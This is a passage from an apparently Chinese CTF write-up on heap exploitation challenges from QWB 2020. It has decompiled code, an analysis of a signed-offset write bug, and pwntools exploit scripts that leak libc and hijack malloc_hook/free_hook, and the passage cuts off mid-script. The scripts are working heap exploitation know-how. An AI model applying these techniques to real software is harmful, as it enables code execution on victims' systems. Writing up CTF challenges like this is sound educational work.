payload<span class="token punctuation">)</span></code></pre><p>add(0x68)来触发unsortedbin attack，使main_arena+88落入global_max_fast,这样后续我们就能够使用fastbin了</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/8.jpg" alt=""></p><p>我们接着dele(3)dele(6),由于chunk3和chunk6都是0x70大小，因此他们都会被链入0x70大小的fastbin中，chunk6的fd处会写入chunk3的地址</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/9.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/10.jpg" alt=""></p><p>接着我们通过chunk2来修改chunk6的fd指向我们一开始分配并且删除的一个chunk</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/11.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/12.jpg" alt=""></p><p>接着我们再通过chunk1修改0x55faa8fba0b0处chunk的fd指针的后四位为IO_2_1_stdout_-0x43的后四位</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/13.jpg" alt=""></p><p>这样我们通过连续申请三个0x68大小的chunk就能申请到IO_2_1_stdout_-0x43处</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>edit_n<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c5600</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>申请过去之后修改stdout结构体的值来泄露libc地址</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/14.jpg" alt=""></p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>edit_n<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>有了libc地址有fastbin，再故技重施，dele chunk3，利用chunk2修改其fd指向malloc_hook-0x23处，利用onegadget劫持程序流即可</p><h3 id="0x2-direct"><a href="#0x2-direct" class="headerlink" title="0x2.direct"></a>0x2.direct</h3><p>保护全开</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/15.jpg" alt=""></p><p>IDA分析</p><p>程序开头有一个sleep(0xA)的函数，把它nop掉</p><p>一共有五个功能</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_E95</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"1. allocate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"2. edit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"3. show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"4. open file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"5. close file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"6. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Your choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>依次分析</p><p>首先是allocate</p><pre class=" language-c"><code class="language-c">size_t __fastcall <span class="token function">add</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> qword_202100<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      size <span class="token operator">=</span> result<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0x100</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          qword_202100<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>          qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>          result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>          result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"allocate failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最多分配16个chunk，最大能分配0x100的chunk</p><p>再看到edit</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">edit</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  size_t nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_2020E0<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_2020E0 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>    v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      result <span class="token operator">=</span> qword_202100<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Offset: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Offset: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v3 <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        nbytes <span class="token operator">=</span> v3<span class="token punctuation">;</span>        v4 <span class="token operator">=</span> v6 <span class="token operator">+</span> v3<span class="token punctuation">;</span>        result <span class="token operator">=</span> qword_202060<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> result <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>qword_202100<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>首先会检查<code>dword_2020E0</code>的值是否存在，存在的话就进入edit功能</p><p>我们输入一个偏移量和要修改的size，然后程序会检查偏移量+size是否会超出这个chunk的size，如果没有超过就从chunk的起始位置+偏移量处开始写值。但这里有问题，if判断值检查了是否存在下溢，没有检查上溢，而offset又是有符号整型，所以这题的漏洞点就在edit功能中。</p><p>再看到show函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">show</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> qword_202100<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202100<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      qword_202100<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>qword_202060<span class="token punctuation">;</span>      qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这show函数其实就是dele函数，没啥看的</p><p>再看到open_file函数</p><pre class=" language-c"><code class="language-c">ssize_t <span class="token function">open_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_2020E0<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_2020E0 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    dirp <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dirp <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    dword_2020E0 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中有一个opendir函数</p><pre><code>OPENDIR(3)                                                                   Linux Programmer's Manual                                                                  OPENDIR(3)NAME       opendir, fdopendir - open a directorySYNOPSIS       #include &lt;sys/types.h&gt;       #include &lt;dirent.h&gt;       DIR *opendir(const char *name);       DIR *fdopendir(int fd);   Feature Test Macro Requirements for glibc (see feature_test_macros(7)):       fdopendir():           Since glibc 2.10:               _POSIX_C_SOURCE &gt;= 200809L           Before glibc 2.10:               _GNU_SOURCEDESCRIPTION       The  opendir() function opens a directory stream corresponding to the directory name, and returns a pointer to the directory stream.  The stream is positioned at the first       entry in the directory.</code></pre><p>作用就是打开一个目录，返回DIR *形态的目录流</p><p>再看到close__file函数</p><pre class=" language-c"><code class="language-c">ssize_t <span class="token function">close_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  ssize_t v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_2020E0<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_2020E0 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span><span class="token function">readdir</span><span class="token punctuation">(</span>dirp<span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> result<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Filename: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>有一个readdir函数</p><pre><code>READDIR(3)                                                                   Linux Programmer's Manual                                                                  READDIR(3)NAME       readdir - read a directorySYNOPSIS       #include &lt;dirent.h&gt;       struct dirent *readdir(DIR *dirp);DESCRIPTION       The readdir() function returns a pointer to a dirent structure representing the next directory entry in the directory stream pointed to by dirp.  It returns NULL on reach‐       ing the end of the directory stream or if an error occurred.       In the glibc implementation, the dirent structure is defined as follows:           struct dirent {               ino_t          d_ino;       /* Inode number */               off_t          d_off;       /* Not an offset; see below */               unsigned short d_reclen;    /* Length of this record */               unsigned char  d_type;      /* Type of file; not supported                                              by all filesystem types */               char           d_name[256]; /* Null-terminated filename */           };</code></pre><p>返回值为下一个目录的进入点</p><p>整理一下题目信息</p><p>1.存在上溢</p><p>2.无输出功能</p><p>这题程序没有输出功能，而且所有的打印函数都是write而不是puts，利用stdout结构体泄露地址需要利用puts函数，所以这题不能用stdout来泄露</p><p>程序中可以进行输出的地方只有close_file功能，open_dir之后close_dir就会依次输出当前文件夹下文件的名称</p><p>opendir函数会申请一个0x8040大小的缓冲区</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/16.jpg" alt=""></p><p>缓冲区的内容如下</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/17.jpg" alt=""></p><p>如果我们能将main_arena+88的地址落入缓冲区中存储着文件名的位置，当输出文件名时就会输出main_arena+88的地址</p><p>我们需要构造出chunkoverlap，把opendir申请的缓冲区包含进去，类似于off-by-null/one的利用手法，然后逐步申请unsortedbin，让main_arena+88的地址落入opendir的缓冲区中，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./direct'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'direct'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Offset: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">open_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>open_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x110</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x8040</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span 